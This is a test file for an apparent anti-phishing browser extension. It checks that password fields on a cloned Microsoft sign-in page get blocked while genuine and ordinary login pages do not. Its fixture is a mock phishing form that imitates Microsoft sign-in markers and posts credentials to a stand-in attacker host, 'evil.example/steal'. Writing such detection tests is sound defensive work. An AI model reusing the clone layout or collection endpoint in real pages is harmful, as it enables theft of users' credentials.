import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { JSDOM, VirtualConsole } from "jsdom";

const rules = JSON.parse(
  fs.readFileSync(new URL("../rules/detection-rules.json", import.meta.url), "utf8")
);
const contentSource = fs.readFileSync(new URL("./content.js", import.meta.url), "utf8");

function microsoftCloneHtml() {
  return `<!DOCTYPE html>
<html>
  <head><title>Sign in to your account</title></head>
  <body>
    <form id="login" method="post" action="https://evil.example/steal">
      <input name="loginfmt" id="i0116" type="email" placeholder="Email">
      <div>Sign in</div>
      <div>Microsoft</div>
      <div>https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/x.jpg</div>
      <div>urlMsaSignUp</div>
      <div>idPartnerPL</div>
      <div>flowToken</div>
      <a href="#help">Help</a>
    </form>
  </body>
</html>`;
}

function plainLoginHtml() {
  return `<!DOCTYPE html>
<html>
  <head><title>Account login</title></head>
  <body>
    <form method="post" action="/session">
      <input type="email" name="email">
    </form>
  </body>
</html>`;
}

function installChrome(window) {
  const runtime = {
    lastError: null,
    getURL(path) {
      return `chrome-extension://test/${path}`;
    },
    sendMessage(message) {
      if (message && message.type === "get_detection_rules") {
        return Promise.resolve({ success: true, rules });
      }
      return Promise.resolve({ success: true, ok: true });
    },
    onMessage: { addListener() {} },
  };
  window.chrome = {
    runtime,
    storage: {
      local: {
        get(keys, callback) {
          const result = {};
          const names = Array.isArray(keys) ? keys : [keys];
          for (const name of names) {
            if (name === "config") result.config = { enablePageBlocking: true };
            if (name === "brandingConfig") result.brandingConfig = {};
          }
          if (typeof callback === "function") callback(result);
          return Promise.resolve(result);
        },
        set(_payload, callback) {
          if (typeof callback === "function") callback();
          return Promise.resolve();
        },
      },
    },
  };
  window.Worker = function Worker() {
    throw new Error("workers unavailable in test");
  };
}

async function loadPage(html, url) {
  const virtualConsole = new VirtualConsole();
  const dom = new JSDOM(html, {
    url,
    runScripts: "outside-only",
    pretendToBeVisual: true,
    virtualConsole,
  });
  const { window } = dom;
  installChrome(window);
  const redirects = [];
  const locationProto = Object.getPrototypeOf(window.location);
  const originalReplace = locationProto.replace;
  Object.defineProperty(locationProto, "replace", {
    configurable: true,
    writable: true,
    value(nextUrl) {
      redirects.push(String(nextUrl));
      return originalReplace.call(this, nextUrl);
    },
  });
  window.eval(contentSource);
  return { window, redirects };
}

function passwordField(window) {
  return window.document.querySelector('input[type="password"]');
}

function addPasswordField(window) {
  const form = window.document.querySelector("form");
  const input = window.document.createElement("input");
  input.type = "password";
  input.name = "passwd";
  form.appendChild(input);
  return input;
}

async function waitFor(predicate, timeoutMs) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    if (predicate()) return;
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  throw new Error(`timed out after ${timeoutMs}ms`);
}

test("password field added after the warning banner is still blocked", async () => {
  const { window, redirects } = await loadPage(
    microsoftCloneHtml(),
    "https://evil.example/login"
  );

  try {
    await waitFor(
      () => window.document.getElementById("ms365-warning-banner"),
      4000
    );

    const input = addPasswordField(window);

    await waitFor(
      () => input.disabled || redirects.length > 0,
      4000
    );

    assert.ok(
      input.disabled || redirects.some((url) => url.includes("blocked.html")),
      "expected the late password form to be disabled or redirected to the block page"
    );
  } finally {
    window.close();
  }
});

test("the real Microsoft login page is not blocked when the password step appears", async () => {
  const { window, redirects } = await loadPage(
    microsoftCloneHtml(),
    "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
  );

  try {
    await new Promise((resolve) => setTimeout(resolve, 400));
    const input = addPasswordField(window);
    await new Promise((resolve) => setTimeout(resolve, 800));

    assert.equal(input.disabled, false);
    assert.equal(redirects.length, 0);
  } finally {
    window.close();
  }
});

test("a normal login page is not blocked when its password field appears", async () => {
  const { window, redirects } = await loadPage(
    plainLoginHtml(),
    "https://bank.example/login"
  );

  try {
    await new Promise((resolve) => setTimeout(resolve, 500));
    const input = addPasswordField(window);
    await new Promise((resolve) => setTimeout(resolve, 1200));

    assert.equal(input.disabled, false);
    assert.equal(redirects.length, 0);
    assert.equal(window.document.getElementById("ms365-warning-banner"), null);
  } finally {
    window.close();
  }
});
